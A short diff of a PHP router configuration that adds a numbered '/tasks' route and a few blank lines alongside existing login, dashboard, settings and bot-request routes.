@@ -28,7 +28,8 @@ if(!$installer){
     $router->all('/login', 'Main@login');
     $router->all('/request', 'BotHandler@request');
     $router->all('/dashboard', 'Main@index');
-    $router->all('/tasks', 'Main@tasks');
+         $router->all('/tasks', 'Main@tasks');
+    $router->all('/tasks/(\d+)', 'Main@tasks');
     $router->all('/logout', 'Main@logout');
     $router->all('/settings', 'Main@settings');
     $router->all('/taskdetails/(\d+)', 'Main@taskdetails');    
@@ -39,6 +40,9 @@ if(!$installer){
 }else{
     $router->all('/install', 'install@index');
 }
+
+
+
 
 
 $template = explode("@",$router->fn);
